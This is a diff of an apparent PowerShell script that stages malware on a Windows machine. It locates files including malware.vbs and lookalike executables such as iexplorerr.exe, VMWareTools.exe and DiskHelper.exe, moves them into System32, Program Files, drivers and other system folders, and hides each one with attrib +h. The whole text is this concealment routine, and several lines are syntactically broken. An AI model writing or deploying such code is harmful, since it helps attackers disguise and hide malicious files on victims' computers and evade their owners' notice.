@@ -3,56 +3,56 @@
 # set PWD to C:
 
 # Find malware.vbs 
-$malvbsLoc = dir malware.vbs /s /p
+$malvbsLoc = Get-ChildItem malware.vbs
 # Move malware.vbs
 move $malvbsLoc C:\Windows\System32
 # Hide the file from windows explorer using attrib 
 attrib +h C:\Windows\System32\malware.vbs
 
 # Find iexplorerr.exe
-$iexplorerrLoc = dir iexplorer.exe /s /p
+$iexplorerrLoc = Get-ChildItem iexplorerr.exe
 # Move iexplorerr.exe
 move $iexplorerrLoc = "C:\Program Files\Common Files\System"
 # Hide the file from windows explorer using attrib
 attrib +h "C:\Program Files\Common Files\System\iexplorerr.exe"
 
 # Find PowerHell.bat
-$powerhellLoc = dir powerHell.bat /s /p
+$powerhellLoc = Get-ChildItem PowerHell.bat
 # Move PowerHell.bat
 move $powerhellLoc C:\Windows\System32
 # Hide the file from windows explorer using attrib
 attrib +h C:\Windows\System32\PowerHell.bat
 
 # Find PowerManagement.exe
-$powermanLoc = dir PowerManagement.exe /s /p
+$powermanLoc = Get-ChildItem PowerManagement.exe
 # Move PowerManagement.exe
 move $powermanLoc C:\Program Files\MSBuild\Microsoft
 # Hide the file from windows explorer using attrib
 attrib +h  C:\Program Files\MSBuild\Microsoft\PowerManagement.exe
 
 # Find VMWareTools.exe
-$vmwaretoolsLoc = dir VMWareTools.exe /s /p
+$vmwaretoolsLoc = Get-ChildItem VMWareTools.exe
 # Move VMWareTools.exe
 move $vmwaretoolsLoc C:\Users\Public
 # Hide VMWareTools.exe
 attrib +h C:\Users\Public\VMWareTools.exe
 
 # Find DiskHelper.exe
-$diskhelperLoc = dir DiskHelper.exe /s /p
+$diskhelperLoc = Get-ChildItem DiskHelper.exe
 # Move DiskHelper.exe
 move $diskhelperLoc = C:\Windows\drivers
 # Hide DiskHelper.exe
 attrib +h C:\Windows\drivers\DiskHelper.exe
 
 # Find audio.exe
-$audioLoc = dir audio.exe /s /p
+$audioLoc = Get-ChildItem audio.exe
 # Move audio.exe
 move $audioLoc C:\Windows\DigitalLocker\en-us
 # Hide audio.exe 
 attrib +h C:\Windows\DigitalLocker\en-us\audio.exe
 
 # Find LogMGMT.exe 
-$logmgmtLoc = dir LogMGMT.exe /s /p
+$logmgmtLoc = Get-ChildItem LogMGMT.exe
 # Move LogMGMT
 move $logmgmtLoc C:\Windows\Globalization\ELS
 # Hide LogMGMT.exe
